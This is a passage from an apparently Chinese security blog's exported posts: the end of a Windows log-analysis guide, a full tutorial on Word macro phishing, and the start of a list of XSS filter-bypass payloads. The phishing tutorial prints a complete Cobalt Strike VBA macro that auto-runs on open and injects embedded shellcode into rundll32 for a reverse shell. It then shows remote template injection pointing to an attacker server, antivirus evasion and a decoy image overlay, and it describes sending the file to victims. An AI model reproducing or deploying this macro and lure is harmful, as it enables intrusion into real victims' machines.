<h4 id="②-查询登录失败的事件"><a href="#②-查询登录失败的事件" class="headerlink" title="② 查询登录失败的事件"></a>② 查询登录失败的事件</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">登录失败的所有事件：</span><br><span class="line">LogParser.exe <span class="literal">-i</span>:EVT –o:DATAGRID  <span class="string">&quot;SELECT *  FROM c:\Security.evtx where EventID=4625&quot;</span></span><br><span class="line"></span><br><span class="line">提取登录失败用户名进行聚合统计：</span><br><span class="line">LogParser.exe  <span class="literal">-i</span>:EVT <span class="string">&quot;SELECT  EXTRACT_TOKEN(Message,13,&#x27; &#x27;)  as EventType,EXTRACT_TOKEN(Message,19,&#x27; &#x27;) as user,count(EXTRACT_TOKEN(Message,19,&#x27; &#x27;)) as Times,EXTRACT_TOKEN(Message,39,&#x27; &#x27;) as Loginip FROM c:\Security.evtx where EventID=4625 GROUP BY Message&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="④-系统历史开关机记录："><a href="#④-系统历史开关机记录：" class="headerlink" title="④ 系统历史开关机记录："></a>④ 系统历史开关机记录：</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">LogParser.exe <span class="literal">-i</span>:EVT –o:DATAGRID  <span class="string">&quot;SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="2、LogParser-Lizard"><a href="#2、LogParser-Lizard" class="headerlink" title="2、LogParser Lizard"></a>2、LogParser Lizard</h2><p>对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。</p>
<p>下载地址：<a href="http://www.lizard-labs.com/log_parser_lizard.aspx">http://www.lizard-labs.com/log_parser_lizard.aspx</a></p>
<p>依赖包：Microsoft .NET Framework 4 .5，下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42642">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a></p>
<p>查询最近用户登录情况：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1649415423545-6433725f-8b40-4a4e-b5d1-de4ae2371227.png" alt="img"></p>
<h2 id="3、Event-Log-Explorer"><a href="#3、Event-Log-Explorer" class="headerlink" title="3、Event Log Explorer"></a>3、Event Log Explorer</h2><p>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p>
<p>下载地址：<a href="https://event-log-explorer.en.softonic.com/">https://event-log-explorer.en.softonic.com/</a></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2893488/1649415443316-970e0f86-64e8-4d61-ac44-1004b4e11721.png" alt="img"></p>
<h1 id="五、参考链接："><a href="#五、参考链接：" class="headerlink" title="五、参考链接："></a>五、参考链接：</h1><ul>
<li>Windows日志分析  <a href="https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ">https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</a></li>
</ul>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
        <tag>日志分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Word宏钓鱼</title>
    <url>/post/42739bea.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、本地加载恶意Word文档-模板文件上线CS"><a href="#一、本地加载恶意Word文档-模板文件上线CS" class="headerlink" title="一、本地加载恶意Word文档/模板文件上线CS"></a>一、本地加载恶意Word文档/模板文件上线CS</h1><h2 id="1、生成监听器"><a href="#1、生成监听器" class="headerlink" title="1、生成监听器"></a>1、生成监听器</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646713989555-d276cb9c-86f3-4a86-ae92-fdbf2cfff951.png" alt="img"></p>
<h2 id="2、使用CobaltStrike生成宏木马"><a href="#2、使用CobaltStrike生成宏木马" class="headerlink" title="2、使用CobaltStrike生成宏木马"></a>2、使用CobaltStrike生成宏木马</h2><p>选择MS Office宏</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646706437538-a9eb1b15-f68f-4880-bc9f-8361a4130e3f.png" alt="img"></p>
<p>选择监听器</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646706460851-0a872c50-02a3-4f57-9008-38bddac2f678.png" alt="img"></p>
<p>提示了使用步骤</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646706484113-5b972bf8-04cf-47e9-9093-f7453730dd80.png" alt="img"></p>
<p>Copy Marco代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Private Type PROCESS_INFORMATION</span><br><span class="line">    hProcess As Long</span><br><span class="line">    hThread As Long</span><br><span class="line">    dwProcessId As Long</span><br><span class="line">    dwThreadId As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">Private Type STARTUPINFO</span><br><span class="line">    cb As Long</span><br><span class="line">    lpReserved As String</span><br><span class="line">    lpDesktop As String</span><br><span class="line">    lpTitle As String</span><br><span class="line">    dwX As Long</span><br><span class="line">    dwY As Long</span><br><span class="line">    dwXSize As Long</span><br><span class="line">    dwYSize As Long</span><br><span class="line">    dwXCountChars As Long</span><br><span class="line">    dwYCountChars As Long</span><br><span class="line">    dwFillAttribute As Long</span><br><span class="line">    dwFlags As Long</span><br><span class="line">    wShowWindow As Integer</span><br><span class="line">    cbReserved2 As Integer</span><br><span class="line">    lpReserved2 As Long</span><br><span class="line">    hStdInput As Long</span><br><span class="line">    hStdOutput As Long</span><br><span class="line">    hStdError As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#Else</span><br><span class="line">    Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long</span><br><span class="line">    Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long</span><br><span class="line">    Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long</span><br><span class="line">    Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#End If</span><br><span class="line"></span><br><span class="line">Sub Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    Dim pInfo As PROCESS_INFORMATION</span><br><span class="line">    Dim sInfo As STARTUPINFO</span><br><span class="line">    Dim sNull As String</span><br><span class="line">    Dim sProc As String</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Dim rwxpage As LongPtr, res As LongPtr</span><br><span class="line">#Else</span><br><span class="line">    Dim rwxpage As Long, res As Long</span><br><span class="line">#End If</span><br><span class="line">    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _</span><br><span class="line">13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _</span><br><span class="line">-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _</span><br><span class="line">-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _</span><br><span class="line">-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,-119,-97, _</span><br><span class="line">-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _</span><br><span class="line">104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _</span><br><span class="line">-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _</span><br><span class="line">-1,-1,47,98,99,81,70,0,110,-60,-16,-88,-109,73,115,86,-74,-83,-24,-104,-51,92,8,108,-99,-3,104,125,92,121,-36,32,109,72,-18,-112,2,43,-91,-8, _</span><br><span class="line">51,17,123,-44,17,-12,125,-79,-88,29,78,32,-93,-47,-20,84,17,77,-33,28,-27,-109,66,30,125,92,-55,119,104,4,-77,-79,108,78,-2,-21,5,42,120,-23, _</span><br><span class="line">-106,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _</span><br><span class="line">83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,87,79,87,54,52,59,32,84,114,105,100,101,110,116,47, _</span><br><span class="line">53,46,48,59,32,70,117,110,87,101,98,80,114,111,100,117,99,116,115,41,13,10,0,-78,-71,-108,93,108,47,-34,39,-99,-23,53,2,70,-89,-117,45,-125, _</span><br><span class="line">-34,-108,-21,11,95,84,18,-45,-114,94,1,51,-3,-75,-99,-37,109,-52,31,-88,24,41,81,-80,14,114,-3,2,105,25,105,30,-15,-13,34,-68,-72,-55,87,-19, _</span><br><span class="line">61,-24,-82,25,-116,107,-104,119,6,124,-37,-17,103,-54,-24,-49,38,10,96,86,55,-88,-95,6,93,43,-93,28,-124,-54,-75,-9,21,28,-72,-98,86,51,84,-89, _</span><br><span class="line">-3,78,103,91,-88,-72,-11,-36,-82,-80,-61,-11,106,-18,100,-92,15,-100,-41,-24,110,63,38,38,104,-108,-80,-127,-61,-77,-98,35,101,-53,-40,51,-109,42,93,-20, _</span><br><span class="line">52,14,71,82,84,-20,121,89,-6,1,-117,-82,13,80,57,-21,121,46,75,38,-6,5,-31,-97,-82,21,-13,-106,-45,11,-5,-51,112,13,5,-40,90,-61,-94,-79, _</span><br><span class="line">48,118,-54,85,-75,-121,36,104,-74,4,-12,73,116,-21,5,-24,-47,95,70,-108,-61,-54,-22,97,118,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _</span><br><span class="line">104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _</span><br><span class="line">-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,48,46,52,46,49,51,46,49,50,52,0,25,105,-96,-115)</span><br><span class="line">    If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;</span><br><span class="line">    Else</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    For offset = LBound(myArray) To UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)</span><br><span class="line">    Next offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">End Sub</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>

<h2 id="3、创建启用恶意宏的Word文档-模板"><a href="#3、创建启用恶意宏的Word文档-模板" class="headerlink" title="3、创建启用恶意宏的Word文档/模板"></a>3、创建启用恶意宏的Word文档/模板</h2><p>创建一个Word，视图-查看宏</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646706572900-e9aabe94-b58c-4601-8495-df66e9c680b1.png" alt="img"></p>
<p>宏名随便输入一个就可以，创建</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646706732821-7ae77177-f5b6-4865-b988-07dd258bd0a4.png" alt="img"></p>
<p>在Project项目中的ThisDocument中添加CS生成的宏代码，并且右上角选择Auto_Open，在对方打开文档时，Word自动运行宏提示信息，提示是否点击</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646707151730-f0a5217d-511c-4a81-9d37-dc41ded3a96f.png" alt="img"></p>
<p>Ctrl + S保存</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646707061575-6e52acf2-7696-4151-b3fe-9b9e1f2ddba6.png" alt="img"></p>
<p>选择使用启用宏的文档/模板，这里我启用宏的word文档和启用宏的模板都弄一个</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646707365362-d528b5ae-2164-48eb-9961-dbf22f7b6ce7.png" alt="img"></p>
<p>保存后报毒了，因为未做任何免杀，继续</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646707433172-54dd4766-da84-4c5c-b248-1c8b3cf76baf.png" alt="img"></p>
<h2 id="4、加载恶意宏文件"><a href="#4、加载恶意宏文件" class="headerlink" title="4、加载恶意宏文件"></a>4、加载恶意宏文件</h2><p>以下动图展示了目标机打开Word文档且启用宏时，反弹shell</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646715091020-f8c83dd7-1f63-44a4-8d41-f304a0a3ada3.gif" alt="img"></p>
<p>以下动图展示了目标机右键打开Word模板时，反弹shell</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646716014761-81200951-756d-42d3-bff4-961f27fc49f4.gif" alt="img"></p>
<blockquote>
<p>双击是无法打开模版文件的，在模版文件上双击默认是以此模版创建新文件，切记。</p>
</blockquote>
<p>本地加载的缺点就是，会被杀软查杀</p>
<h1 id="二、远程加载恶意Word模板文件上线CS"><a href="#二、远程加载恶意Word模板文件上线CS" class="headerlink" title="二、远程加载恶意Word模板文件上线CS"></a>二、远程加载恶意Word模板文件上线CS</h1><p>利用Word文档加载附加模板时的缺陷所发起的恶意请求而达到的攻击目的，所以当目标用户点开攻击者发给他的恶意word文档就可以通过向远程服务器请求恶意模板并执行恶意模板上的恶意代码。</p>
<p>这里，我们借助CobaltStrike生成office宏病毒，在将恶意宏嵌入到Word模板中，诱使受害者远程打开并加载带有宏的恶意Word模版，至目标主机成功上线CobaltStrike。</p>
<p>缺点：目标主机的网速决定了加载远程模版的速度。有可能文件打开的会特别慢(例如将远程模版放在github)，受害者可能在文件打开一半的时候强制关闭word。加载位于github上的恶意模板内容，有点慢，我们可以放在vps上，这样速度就快些了。</p>
<p>优点：因为是远程加载，所以免杀效果十分不错。基本不会被杀毒软件拦截。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220308154841432.png" alt="image-20220308154841432"></p>
<h2 id="1、将恶意模板文件上传到服务器"><a href="#1、将恶意模板文件上传到服务器" class="headerlink" title="1、将恶意模板文件上传到服务器"></a>1、将恶意模板文件上传到服务器</h2><p>将之前制作的含有恶意代码的模板文件上传到服务器上（我这里以kali开启HTTP服务为例）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646721514872-634b0fee-f354-4d79-90a7-7b9fd54fc0f3.png" alt="img"></p>
<h2 id="2、构造恶意的docx钓鱼文件"><a href="#2、构造恶意的docx钓鱼文件" class="headerlink" title="2、构造恶意的docx钓鱼文件"></a>2、构造恶意的docx钓鱼文件</h2><p>打开word找一个任意的模板使用</p>
<p>这里我就通过录制宏，另存为<code>1.dotm</code>模板文件到Office模板目录下，自己制作一个模板</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646719903313-43ccfbd5-7979-4b6d-9747-7390331b50ed.gif" alt="img"></p>
<p>直接继续在开始一栏新建–导入之前做好的模板文件<code>1.dotm</code>，保存为<code>嘿嘿.docx</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646720328145-40ed0a52-385b-4dd5-b4ae-2aac443ec60c.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646720446925-83d40337-ef2f-49ab-89ae-0deddd9e2c98.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646720700246-75e7c0c6-6f9b-4dfb-a696-2121e555d038.png" alt="img"></p>
<p>将后缀名改为zip</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646720729291-7043c46d-3e0e-44f3-82f3-ba13d7fcb37c.png" alt="img"></p>
<p>解压缩</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646720760370-02a49df4-a832-41cb-a192-6878e8e5a480.png" alt="img"></p>
<p>进入word文件夹中的_rels，找到settings.xml.rels文件，编辑这个文件，将其的target属性的值改为服务器的URL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip:port/获奖名单.dotm?raw=true</span><br><span class="line">或者</span><br><span class="line">http://域名/获奖名单.dotm?raw=true</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646721473793-ca525925-718d-4751-bc50-68dd1d429609.png" alt="img"></p>
<p>完成后，将刚才解压生成的文件再压缩回去</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646721075677-c3e94461-360b-4b80-bcd0-f372c9d878be.png" alt="img"></p>
<p>并且将生成的文件改名为后缀名为docx的文件</p>
<blockquote>
<p>这里利用的是分离免杀的方法，里面的代码都是正常的，由于杀毒软件是静态查杀，所以无法查杀的！</p>
</blockquote>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220308152515498.png" alt="image-20220308152515498"></p>
<h2 id="3、加载服务器上的恶意文件反弹shell"><a href="#3、加载服务器上的恶意文件反弹shell" class="headerlink" title="3、加载服务器上的恶意文件反弹shell"></a>3、加载服务器上的恶意文件反弹shell</h2><p>将最终生成的恶意文件——<code>嘿嘿.docx</code>用邮箱钓鱼、qq或微信文件发送给受害者，当受害者双击打开“<code>嘿嘿.docx</code>”文件，启用宏时，恶意代码会执行，目标主机会上线</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646721902197-e4175949-3ede-4df3-8d40-d5e42253cb03.gif" alt="img"></p>
<h2 id="4、进阶伪装–背景虚拟化图片的覆盖"><a href="#4、进阶伪装–背景虚拟化图片的覆盖" class="headerlink" title="4、进阶伪装–背景虚拟化图片的覆盖"></a>4、进阶伪装–背景虚拟化图片的覆盖</h2><p>从刚刚的实验可以知道，启动word后，还需要用户点击启用宏，稍有戒备心的就不会开启，因此我们需要再做一些钓鱼工作</p>
<p>以下内容来自公众号Gamma实验室的内容，链接已在参考链接给出。暂时不对此进行复现，了解有这种骚操作即可。</p>
<p>在网上随便找个模板，复制黏贴进去，截图另存为</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723329642-1eb38009-8c6b-4678-bbd1-1edecba0903d.png" alt="img"></p>
<p>打开我们的神器，美图秀秀，打开我们刚截图的图片，点击背景虚拟化，调整虚拟化程度，最好是那种弱影弱现的感觉最nice，然后加上一些说明嗷</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723357498-4b434db3-f848-4dbf-b4f3-14ba41f75357.png" alt="img"></p>
<p>然后设置图片尺寸为790，1120</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723381555-7944c159-7bad-4332-a6e6-8046704566d4.png" alt="img"></p>
<p>然后保存，然后就可以看到效果了</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723403051-01f3d6d2-4eca-4499-b812-73854cfb372b.png" alt="img"></p>
<p>为什么会设置成790x1120嘞，只是为了刚好覆盖word里面的文本，然后docx文档另存为doc文档</p>
<p>然后打开，去开启显示开发者工具选项卡，文件-&gt;选项-&gt;自定义功能区-&gt;主选项卡-&gt;开发者工具</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723434615-5f00d1e4-2a2a-4ba2-b124-0543e068b863.png" alt="img"></p>
<p>然后点击开发者工具，选择图像（Active控件）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723482821-f0c2e5e2-79b8-416d-ba23-0b24e7b01a41.png" alt="img"></p>
<p>设置图像格式为浮于文字上方，并把图像拉满</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723501481-bb0a30e8-e538-441d-8ee4-06aa6de9780e.png" alt="img"></p>
<p>效果就是这样，会把文字全部覆盖</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723527417-f2bd4752-3415-4e80-b170-983deb0a7a14.png" alt="img"></p>
<p>然后点击图像属性，设置成我们做好的图片，然后点击宏创建宏，cs生成宏木马</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723557340-0b817587-6264-4c06-a57b-bc4b4804cb5a.png" alt="img"></p>
<p>复制粘贴，在Auto_Open（）函数首部编写代码，设置图片位置为0高度为0让宏运行后doc上图片消失，然后保存，office马就制作好了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Project.ThisDocument.Image1.Top = 0</span><br><span class="line">Project.ThisDocument.Image1.Width = 0</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723598308-c7b783ce-0e1f-4059-9b4e-04953f15cf7f.png" alt="img"></p>
<p>成品展示：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1646723624238-1fcb9911-48c3-4926-988c-45644726d0d6.png" alt="img"></p>
<h1 id="三、其他思路"><a href="#三、其他思路" class="headerlink" title="三、其他思路"></a>三、其他思路</h1><p>如果是遇到WPS的客户怎么办？通过上面的方法WPS打开我的简历是不会提示宏的</p>
<p>其他思路：</p>
<ol>
<li>打开WPS创建宏是暗色的需要安装VBA for WPS才可以写WPS宏病毒代码执行！</li>
<li>Office和WPS中还可以隐藏文字，可以利用该方式通过配合录制宏的方法，用该方式执行…</li>
<li>Normal模块下，不止能编写一个settings.xml.rels…可以多宏…</li>
<li>弹框执行代码写入宏，那么Excel、PPT等也写…</li>
<li>不止docx宏，还有很多，能另存文件内容的都可以…</li>
</ol>
<h1 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h1><ul>
<li><p><a href="https://www.cnblogs.com/zzjdbk/p/14435769.html">https://www.cnblogs.com/zzjdbk/p/14435769.html</a></p>
</li>
<li><p><a href="https://blog.csdn.net/qq_34801745/article/details/111307768">https://blog.csdn.net/qq_34801745/article/details/111307768</a></p>
</li>
<li><p><a href="https://cloud.tencent.com/developer/article/1799424">https://cloud.tencent.com/developer/article/1799424</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>APT/社工</category>
      </categories>
      <tags>
        <tag>CobaltStrike</tag>
        <tag>钓鱼</tag>
        <tag>社工</tag>
        <tag>APT</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS的Waf绕过及工具使用</title>
    <url>/post/c970015a.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、常用payload"><a href="#一、常用payload" class="headerlink" title="一、常用payload"></a>一、常用payload</h1><h2 id="1、echo"><a href="#1、echo" class="headerlink" title="1、echo"></a>1、echo</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="2、img标签"><a href="#2、img标签" class="headerlink" title="2、img标签"></a>2、img标签</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(String.formCharCode(88,83,83))</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">scr</span>=<span class="string">&quot;URL&quot;</span> <span class="attr">style</span>=<span class="string">&#x27;Xss:expression(alert(xss));&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&quot;<span class="attr">alert</span>(&#x27;<span class="attr">xss</span>&#x27;)&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="3、CSS"><a href="#3、CSS" class="headerlink" title="3、CSS"></a>3、CSS</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">STYLE</span>=<span class="string">&quot;background-image:url(javascript:alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

